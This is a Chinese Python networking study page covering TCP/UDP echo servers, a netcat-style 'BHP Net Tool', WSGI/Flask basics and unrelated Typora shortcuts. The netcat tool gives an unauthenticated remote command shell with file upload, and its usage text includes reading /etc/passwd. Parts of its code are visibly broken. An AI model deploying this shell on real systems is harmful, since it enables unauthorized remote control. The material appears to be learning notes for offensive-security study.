<p>服务器进程首先要绑定一个端口并监听来自其他客户端的连接。如果某个客户端连接过来了，服务器就与该客户端建立Socket连接，随后的通信就靠这个Socket连接了。</p>
<p>所以，服务器会打开固定端口（比如80）监听，每来一个客户端连接，就创建该Socket连接。由于服务器会有大量来自客户端的连接，所以，服务器要能够区分一个Socket连接是和哪个客户端绑定的。</p>
<p><strong>一个Socket依赖4项：服务器地址、服务器端口、客户端地址、客户端端口来唯一确定一个Socket。</strong></p>
<p>但是服务器还需要同时响应多个客户端的请求，所以，<strong>每个连接都需要一个新的进程或者新的线程来处理</strong>，否则，服务器一次就只能服务一个客户端了。</p>
<p>我们来编写一个简单的服务器程序，它接收客户端连接，把客户端发过来的字符串加上<code>Hello</code>再发回去。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server</span><span class="params">()</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.bind((<span class="string">'127.0.0.1'</span>,<span class="number">8888</span>))</span><br><span class="line">    s.listen(<span class="number">5</span>)</span><br><span class="line">    print(<span class="string">"waiting for connection ..."</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sock,addr=s.accept()</span><br><span class="line">        t=threading.Thread(target=tcplink,args=(sock,addr))</span><br><span class="line">        t.start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcplink</span><span class="params">(sock,addr)</span>:</span></span><br><span class="line">    print(<span class="string">'Accept new connection from %s:%s...'</span>%addr)</span><br><span class="line">    sock.send(<span class="string">b'welcome!'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data=sock.recv(<span class="number">1024</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data <span class="keyword">or</span> data.decode(<span class="string">'utf-8'</span>)==<span class="string">'exit'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sock.send((<span class="string">'Hello,%s!'</span> % data.decode(<span class="string">'utf-8'</span>)).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    sock.close()<span class="comment">#注意等循环结束再关闭</span></span><br><span class="line">    print(<span class="string">'connetion from %s:%s closed'</span>%addr)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    server()</span><br></pre></td></tr></table></figure>

<p>客户端发送数据检测：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span>  socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># 建立连接:</span></span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>))</span><br><span class="line"><span class="comment"># 接收欢迎消息:</span></span><br><span class="line">print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> [<span class="string">b'Michael'</span>, <span class="string">b'Tracy'</span>, <span class="string">b'Sarah'</span>]:</span><br><span class="line">    <span class="comment"># 发送数据:</span></span><br><span class="line">    s.send(data)</span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">s.send(<span class="string">b'exit'</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<p>首先，创建一个基于IPv4和TCP协议的Socket：</p>
<p>然后，我们要绑定监听的地址和端口。服务器可能有多块网卡，可以绑定到某一块网卡的IP地址上，也可以用<strong><code>0.0.0.0</code>绑定到所有的网络地址</strong>，还可以用<code>127.0.0.1</code>绑定到本机地址。<code>127.0.0.1</code>是一个特殊的IP<strong>地址</strong>，表示本机地址，如果绑定到这个地址，客户端必须同时在本机运行才能连接，也就是说，外部的计算机无法连接进来。</p>
<p>端口号需要预先指定。因为我们写的这个服务不是标准服务，所以用<code>8888</code>这个端口号。请注意，<strong>小于<code>1024</code>的端口号必须要有管理员权限才能绑定：</strong></p>
<p><code>accept()</code>会等待并返回一个客户端的连接:</p>
<p>我们需要打开两命令行窗口，一个运行服务器程序，另一个运行客户端程序，就可以看到效果了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">┌────────────────────────────────────────────────────────┐</span><br><span class="line">│Command Prompt                                    - □ x │</span><br><span class="line">├────────────────────────────────────────────────────────┤</span><br><span class="line">│$ python echo_server.py                                 │</span><br><span class="line">│Waiting <span class="keyword">for</span> connection...                               │</span><br><span class="line">│Accept new connection <span class="keyword">from</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">64398.</span>..           │</span><br><span class="line">│Connection <span class="keyword">from</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">64398</span> closed.                 │</span><br><span class="line">│                                                        │</span><br><span class="line">│       ┌────────────────────────────────────────────────┴───────┐</span><br><span class="line">│       │Command Prompt                                    - □ x │</span><br><span class="line">│       ├────────────────────────────────────────────────────────┤</span><br><span class="line">│       │$ python echo_client.py                                 │</span><br><span class="line">│       │Welcome!                                                │</span><br><span class="line">│       │Hello, Michael!                                         │</span><br><span class="line">└───────┤Hello, Tracy!                                           │</span><br><span class="line">        │Hello, Sarah!                                           │</span><br><span class="line">        │$                                                       │</span><br><span class="line">        │                                                        │</span><br><span class="line">        │                                                        │</span><br><span class="line">        └────────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>

<p>TCP小结</p>
<p>用TCP协议进行Socket编程在Python中十分简单，对于客户端，要主动连接服务器的IP和指定端口，对于服务器，要首先监听指定端口，然后，对每一个新的连接，创建一个线程或进程来处理。通常，服务器程序会无限运行下去。</p>
<p>同一个端口，被一个Socket绑定了以后，就不能被别的Socket绑定了。</p>
<h4 id="3-UDP客户端"><a href="#3-UDP客户端" class="headerlink" title="3.UDP客户端"></a>3.UDP客户端</h4><p>TCP是建立可靠连接，并且通信双方都可以以流的形式发送数据。相对TCP，UDP则是面向无连接的协议。</p>
<p>使用UDP协议时，不需要建立连接，<strong>只需要知道对方的IP地址和端口号，就可以直接发数据包。但是，能不能到达就不知道了。</strong></p>
<p>虽然用UDP传输数据不可靠，但它的优点是和TCP比，速度快，对于不要求可靠到达的数据，就可以使用UDP协议。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.bind((<span class="string">'127.0.0.1'</span>,<span class="number">9999</span>))</span><br><span class="line">print(<span class="string">'bind udp on 9999'</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data, addr=s.recvfrom(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">'Received from %s:%s.'</span> % addr)</span><br><span class="line">    print(data.decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    s.sendto(<span class="string">b'Hello, %s!'</span> % data, addr)</span><br></pre></td></tr></table></figure>

<p>创建Socket时，<strong><code>SOCK_DGRAM</code>指定了这个Socket的类型是UDP</strong>。绑定端口和TCP一样，但是<strong>不需要调用<code>listen()</code>方法</strong>，而是直接接收来自任何客户端的数据：</p>
<p><code>recvfrom()</code>方法<strong>返回数据和客户端的地址与端口</strong>，这样，服务器收到数据后，直接调用<code>sendto()</code>就可以把数据用UDP发给客户端。</p>
<p><strong>注意这里省掉了多线程</strong>，因为这个例子很简单。</p>
<p>客户端使用UDP时，首先仍然创建基于UDP的Socket，然后，<strong>不需要调用<code>connect()</code>，直接通过<code>sendto()</code>给服务器</strong>发数据：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> [<span class="string">b'Michael'</span>, <span class="string">b'Tracy'</span>, <span class="string">b'Sarah'</span>]:</span><br><span class="line">    <span class="comment"># 发送数据:</span></span><br><span class="line">    s.sendto(data, (<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>))</span><br><span class="line">    <span class="comment"># 接收数据:</span></span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<p>从服务器接收数据仍然调用<code>recv()</code>方法。</p>
<p>仍然用两个命令行分别启动服务器和客户端测试，结果如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">┌────────────────────────────────────────────────────────┐</span><br><span class="line">│Command Prompt                                    - □ x │</span><br><span class="line">├────────────────────────────────────────────────────────┤</span><br><span class="line">│$ python udp_server.py                                  │</span><br><span class="line">│Bind UDP on <span class="number">9999.</span>..                                     │</span><br><span class="line">│Received <span class="keyword">from</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">63823.</span>..                        │</span><br><span class="line">│Received <span class="keyword">from</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">63823.</span>..                        │</span><br><span class="line">│Received <span class="keyword">from</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">63823.</span>..                        │</span><br><span class="line">│       ┌────────────────────────────────────────────────┴───────┐</span><br><span class="line">│       │Command Prompt                                    - □ x │</span><br><span class="line">│       ├────────────────────────────────────────────────────────┤</span><br><span class="line">│       │$ python udp_client.py                                  │</span><br><span class="line">│       │Welcome!                                                │</span><br><span class="line">│       │Hello, Michael!                                         │</span><br><span class="line">└───────┤Hello, Tracy!                                           │</span><br><span class="line">        │Hello, Sarah!                                           │</span><br><span class="line">        │$                                                       │</span><br><span class="line">        │                                                        │</span><br><span class="line">        │                                                        │</span><br><span class="line">        └────────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>

<p><strong>UDP小结</strong></p>
<p>UDP的使用与TCP类似，但是不需要建立连接。此外，<strong>服务器绑定UDP端口和TCP端口互不冲突</strong>，也就是说，UDP的9999端口与TCP的9999端口可以各自绑定。</p>
<h4 id="4-取代netcat"><a href="#4-取代netcat" class="headerlink" title="4.取代netcat"></a>4.取代netcat</h4><p>netcat的功能如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"><span class="keyword">import</span> threadin g</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义一些全局变量</span></span><br><span class="line">listen = <span class="literal">False</span></span><br><span class="line">command = <span class="literal">False</span></span><br><span class="line">upload = <span class="literal">False</span></span><br><span class="line">execute = <span class="string">""</span></span><br><span class="line">target = <span class="string">""</span></span><br><span class="line">upload_destination = <span class="string">""</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"BHP Net Tool"</span>)</span><br><span class="line">    print()</span><br><span class="line">    print(<span class="string">"Usage: bhpnet.py -t targt_host -p port"</span>)</span><br><span class="line">    print(<span class="string">"-l --listen          - listen on [host]:[port] for incoming connections"</span>)</span><br><span class="line">    print(<span class="string">"-e --execute=file_to_run - execute the given file upon receiving a connetction"</span>)</span><br><span class="line">    print(<span class="string">"-c command           - initialize a command shell"</span>)</span><br><span class="line">    print(<span class="string">"-u --upload-destination  - upon receiving connection upload a file and write to [destionation]"</span>)</span><br><span class="line">    print()</span><br><span class="line">    print()</span><br><span class="line">    print(<span class="string">"Examples: "</span>)</span><br><span class="line">    print(<span class="string">"bhpnet.py -t 192.168.0.1 -p 5555 -l -c"</span>)</span><br><span class="line">    print(<span class="string">"bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"</span>)</span><br><span class="line">    print(<span class="string">"bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""</span>)</span><br><span class="line">    print(<span class="string">"echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_sender</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#连接到目标主机</span></span><br><span class="line">        client.connect((target,port))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(buffer): <span class="comment">#检测是否从标准输入中接收到数据</span></span><br><span class="line">            client.send(buffer.encode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            recv_len = <span class="number">1</span></span><br><span class="line">            response = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> recv_len:</span><br><span class="line"></span><br><span class="line">                data = client.recv(<span class="number">4096</span>) <span class="comment">#接收回传数据</span></span><br><span class="line">                recv_len = len(data)</span><br><span class="line">                response+= data.decode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> recv_len &lt; <span class="number">4096</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            print(response)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#等待更多的输入</span></span><br><span class="line">            buffer = input(<span class="string">""</span>) <span class="comment">#python3中没有raw_input()</span></span><br><span class="line">            buffer += <span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line">            client.send(buffer.encode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"[*] Exception! Exiting."</span>)</span><br><span class="line">        client.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_loop</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果没有定义目标，那么我们监听所有接口</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(target):</span><br><span class="line">        target = <span class="string">"0.0.0.0"</span></span><br><span class="line"></span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server.bind((target,port))</span><br><span class="line"></span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket, addr = server.accept()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#分拆一个线程处理新的客户端</span></span><br><span class="line">        client_thread = threading.Thread(target=client_handler,</span><br><span class="line">                                         args=(client_socket,))</span><br><span class="line">        client_thread.start()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span><span class="params">(command)</span>:</span></span><br><span class="line"></span><br><span class="line">    command = command.rstrip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        output = <span class="string">"Failed to execute command.\r\n"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_handler</span><span class="params">(client_socket)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> upload</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检测上传文件</span></span><br><span class="line">    <span class="keyword">if</span> len(upload_destination):</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 读取所有的字符并写下目标</span></span><br><span class="line">        file_buffer = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 持续读取数据直到没有符合的数据</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file_buffer += data</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file_descriptor = open(upload_destination,<span class="string">"wb"</span>)</span><br><span class="line">            file_descriptor.write(file_buffer)</span><br><span class="line">            file_descriptor.close()</span><br><span class="line"></span><br><span class="line">            client_socket.send(<span class="string">"Successfully saved file to %s\r\n"</span> % upload_destination)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            client_socket.send(<span class="string">"Failed to save file to %s\r\n"</span> % upload_destination)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(execute):</span><br><span class="line">        output = run_command(execute)</span><br><span class="line">        client_socket.send(output)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> command:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket.send(<span class="string">b"&lt;BHP:#&gt; "</span>)</span><br><span class="line"></span><br><span class="line">            cmd_buffer = <span class="string">""</span></span><br><span class="line">            <span class="keyword">while</span> <span class="string">"\n"</span> <span class="keyword">not</span> <span class="keyword">in</span> cmd_buffer:</span><br><span class="line">                cmd_buffer += client_socket.recv(<span class="number">1024</span>).decode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">                response = run_command(cmd_buffer)</span><br><span class="line"></span><br><span class="line">                client_socket.send(response)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> listen</span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> upload_destination</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(sys.argv[<span class="number">1</span>:]): <span class="comment">#获取参数</span></span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#读取命令行选项</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opts, args = getopt.getopt(sys.argv[<span class="number">1</span>:],<span class="string">"hle:t:p:cu:"</span>, [<span class="string">"help"</span>,<span class="string">"listen"</span>,<span class="string">"execute"</span>,<span class="string">"target"</span>,<span class="string">"port"</span>,<span class="string">"command"</span>,<span class="string">"upload"</span>])</span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError <span class="keyword">as</span> err:</span><br><span class="line">        print(str(err))</span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> o,a <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> o <span class="keyword">in</span> (<span class="string">"-h"</span>,<span class="string">"--help"</span>):</span><br><span class="line">            usage()</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-l"</span>,<span class="string">"--listen"</span>):</span><br><span class="line">            listen = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-e"</span>, <span class="string">"--execute"</span>):</span><br><span class="line">            execute = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-c"</span>, <span class="string">"--commandshell"</span>):</span><br><span class="line">            command = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-u"</span>, <span class="string">"--upload"</span>):</span><br><span class="line">            upload_destination = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-t"</span>, <span class="string">"--target"</span>):</span><br><span class="line">            target = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-p"</span>, <span class="string">"--port"</span>):</span><br><span class="line">            port = int(a)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">assert</span> <span class="literal">False</span>,<span class="string">"Unhandled Option"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#监听还是仅从标准输入发送数据</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> listen <span class="keyword">and</span> len(target) <span class="keyword">and</span> port &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#从命令行读取内存数据</span></span><br><span class="line">        <span class="comment"># 这里将阻塞， 所以不再向标准输入发送数据时发送CTRL-D</span></span><br><span class="line">        buffer = sys.stdin.read()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#发送数据</span></span><br><span class="line">        client_sender(buffer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始监听并准备上传文件、执行命令</span></span><br><span class="line">    <span class="comment"># 放置一个反弹shell</span></span><br><span class="line">    <span class="comment"># 取决于上面的命令行选项</span></span><br><span class="line">    <span class="keyword">if</span> listen:</span><br><span class="line">        server_loop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>































<h3 id="Web攻击"><a href="#Web攻击" class="headerlink" title="Web攻击"></a>Web攻击</h3><h4 id="1-web开发相关知识"><a href="#1-web开发相关知识" class="headerlink" title="1.web开发相关知识"></a>1.web开发相关知识</h4><p>Web应用的本质就是：</p>
<ol>
<li>浏览器发送一个HTTP请求；</li>
<li>服务器收到请求，生成一个HTML文档；</li>
<li>服务器把HTML文档作为HTTP响应的Body发送给浏览器；</li>
<li>浏览器收到HTTP响应，从HTTP Body取出HTML文档并显示。</li>
</ol>
<p>所以，最简单的Web应用就是先把HTML用文件保存好，用一个现成的HTTP服务器软件，接收用户请求，从文件中读取HTML，返回。Apache、Nginx、Lighttpd等这些常见的静态服务器就是干这件事情的。</p>
<p>如果要动态生成HTML，就需要把上述步骤自己来实现。不过，接受HTTP请求、解析HTTP请求、发送HTTP响应都是苦力活，如果我们自己来写这些底层代码，还没开始写动态HTML呢，就得花个把月去读HTTP规范。</p>
<p>正确的做法是底层代码由专门的服务器软件实现，我们用Python专注于生成HTML文档。因为我们不希望接触到TCP连接、HTTP原始请求和响应格式，所以，需要一个统一的接口，让我们专心用Python编写Web业务。</p>
<p>这个接口就是WSGI：Web Server Gateway Interface。</p>
<p>WSGI接口定义非常简单，它只要求Web开发者实现一个函数，就可以响应HTTP请求。我们来看一个最简单的Web版本的“Hello, web!”：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> wsgiref.simple_server <span class="keyword">import</span> make_server</span><br><span class="line"></span><br><span class="line"><span class="comment">#environ 一个包含所有HTTP请求信息的dict对象</span></span><br><span class="line"><span class="comment">#star_response 一个发送HTTP响应的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">application</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    <span class="comment">#header只能发送一次，即只能调用一次star_response</span></span><br><span class="line">    <span class="comment">#start_response接收2个参数，一个是http响应码，一个是一组list，表示header</span></span><br><span class="line">    start_response(<span class="string">'200 OK'</span>, [(<span class="string">'Content-Type'</span>, <span class="string">'text/html'</span>)])</span><br><span class="line">    body = <span class="string">'&lt;h1&gt;Hello, %s!&lt;/h1&gt;'</span> % (environ[<span class="string">'PATH_INFO'</span>][<span class="number">1</span>:] <span class="keyword">or</span> <span class="string">'web'</span>) <span class="comment">#localhost../chj 动态输出</span></span><br><span class="line">    <span class="comment">#body = '&lt;h1&gt;hello, &#123;&#125;&lt;/h1&gt;'.format((environ['PATH_INFO'][1:] or 'wsgi'))</span></span><br><span class="line">    print(body)</span><br><span class="line">    <span class="keyword">return</span> [body.encode(<span class="string">'utf-8'</span>)]</span><br><span class="line"></span><br><span class="line">httpd = make_server(<span class="string">''</span>, <span class="number">8000</span>, application)</span><br><span class="line">print(<span class="string">'Serving HTTP on port 8000...'</span>)</span><br><span class="line">httpd.serve_forever() <span class="comment">#开始监听HTTP请求</span></span><br></pre></td></tr></table></figure>

<p>小结：无论多么复杂的Web应用程序，入口都是一个WSGI处理函数。HTTP请求的所有输入信息都可以通过<code>environ</code>获得，HTTP响应的输出都可以通过<code>start_response()</code>加上函数返回值作为Body。</p>
<p>复杂的Web应用程序，光靠一个WSGI函数来处理还是太底层了，我们需要在WSGI之上再抽象出Web框架，进一步简化Web开发。</p>
<p>除了Flask，常见的Python Web框架还有：</p>
<ul>
<li><a href="https://www.djangoproject.com/" target="_blank" rel="noopener">Django</a>：全能型Web框架；</li>
<li><a href="http://webpy.org/" target="_blank" rel="noopener">web.py</a>：一个小巧的Web框架；</li>
<li><a href="http://bottlepy.org/" target="_blank" rel="noopener">Bottle</a>：和Flask类似的Web框架；</li>
<li><a href="http://www.tornadoweb.org/" target="_blank" rel="noopener">Tornado</a>：Facebook的开源异步Web框架。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;Home&lt;/h1&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/signin', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signin_form</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''&lt;form action="/signin" method="post"&gt;</span></span><br><span class="line"><span class="string">              &lt;p&gt;&lt;input name="username"&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">              &lt;p&gt;&lt;input name="password" type="password"&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">              &lt;p&gt;&lt;button type="submit"&gt;Sign In&lt;/button&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">              &lt;/form&gt;'''</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/signin', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signin</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 需要从request对象读取表单内容：</span></span><br><span class="line">    <span class="keyword">if</span> request.form[<span class="string">'username'</span>]==<span class="string">'admin'</span> <span class="keyword">and</span> request.form[<span class="string">'password'</span>]==<span class="string">'password'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;h3&gt;Hello, admin!&lt;/h3&gt;'</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h3&gt;Bad username or password.&lt;/h3&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>













<h4 id="2-urllib2-库"><a href="#2-urllib2-库" class="headerlink" title="2.urllib2 库"></a>2.urllib2 库</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib2</span><br><span class="line">body &#x3D; urllib2.urlopen(&quot;http:&#x2F;&#x2F;www.nostarch.com&quot;)</span><br><span class="line">print body.read()</span><br></pre></td></tr></table></figure>





<h3 id="typora软件的windows快捷键"><a href="#typora软件的windows快捷键" class="headerlink" title="typora软件的windows快捷键"></a>typora软件的windows快捷键</h3><h4 id="文件类"><a href="#文件类" class="headerlink" title="文件类"></a>文件类</h4><ul>
<li>新建文件： <code>ctrl</code> + <code>N</code></li>
<li>新建窗口： <code>ctrl</code> + <code>shift</code> + <code>N</code></li>
<li>打开： <code>ctrl</code> + <code>O</code></li>
<li>快速打开： <code>ctrl</code> + <code>P</code></li>
<li>保存： <code>ctrl</code> + <code>S</code></li>
<li>另存为： <code>ctrl</code> + <code>shift</code> + <code>S</code></li>
<li>关闭： <code>ctrl</code> + <code>W</code></li>
</ul>
<h4 id="编辑类"><a href="#编辑类" class="headerlink" title="编辑类"></a>编辑类</h4><ul>
<li>撤销： <code>ctrl</code> + <code>Z</code></li>
<li>重做： <code>ctrl</code> + <code>Y</code></li>
<li>剪切： <code>ctrl</code> + <code>X</code></li>
<li>粘贴： <code>ctrl</code> + <code>V</code></li>
<li>复制为Markdown：<code>ctrl</code> + <code>shift</code> + <code>C</code></li>
<li>粘贴为纯文本： <code>ctrl</code> + <code>shift</code> + <code>C</code></li>
<li>全选： <code>ctrl</code> + <code>A</code></li>
<li>选中当前行： <code>ctrl</code> + <code>L</code></li>
<li>选中当前词： <code>ctrl</code> + <code>D</code></li>
